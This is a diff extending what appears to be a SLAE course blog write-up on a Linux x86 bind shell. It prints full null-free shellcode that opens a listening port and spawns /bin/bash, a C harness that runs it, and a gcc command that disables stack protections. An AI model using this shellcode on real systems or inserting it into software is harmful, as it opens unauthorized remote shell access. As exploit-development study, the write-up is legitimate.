@@ -181,6 +181,51 @@ Below is the finished assembly written using the described Syscalls above. The c
 The written assmebly is compiled using the script 'compile.sh' seen on my SLAE github page. This compiles the code with nasm and links it with ld. Once this is done, the compiled shellcode works as can be seen below:
 
 ![Bind_Run](https://raw.githubusercontent.com/14Deep/14deep.github.io/master/_posts/Images/EX1/Bind_Run.png)
+
 *The running compiled assembly*
+
+![Bind_Connect](https://raw.githubusercontent.com/14Deep/14deep.github.io/master/_posts/Images/EX1/Bind_connect.png)
+
+*The connection to the bind shell*
+
+To obtain shellcode from the compiled assembly, a combination of linux commands can be used which can be found [here](http://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump):
+
+*objdump -d ./PROGRAM|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'*
+
+This presents the following:
+
+"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x50\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc2\xb0\x66\xb3\x02\x56\x66\x68\x01\x4d\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x52\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x56\x52\x89\xe1\xcd\x80\x89\xc2\xb0\x3f\x89\xd3\x89\xf1\xcd\x80\xb0\x3f\x41\xcd\x80\xb0\x3f\x41\xcd\x80\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
+
+As can be seen, there are no null bytes within this shellcode. 
+
+
+**Testing the Shellcode**
+
+To test the shellcode it is inserted within a small C program:
+
+~~~
+#include<stdio.h>	
+	#include<string.h>
+	unsigned char code[] = \
+	"shellcode here";
+	main()
+	{
+	printf("Shellcode Length: %d\n", strlen(code));
+	int (*ret)() = (int(*)())code;
+	ret();
+	}
+~~~
+
+It is then compiled with the following command to prevent any memory protections when compiling:
+
+*gcc -fno-stack-protector -z execstack shellcode.c -o shellcodeprog*
+
+The program can now be run to determine if the code will work:
+
+![Shellcode_Test](https://raw.githubusercontent.com/14Deep/14deep.github.io/master/_posts/Images/EX1/shellcode_test.png)
+
+With the connection to the selected port being successful:
+
+![Shellcode_Connect](https://raw.githubusercontent.com/14Deep/14deep.github.io/master/_posts/Images/EX1/shellcode_test_connect.png)
 
 
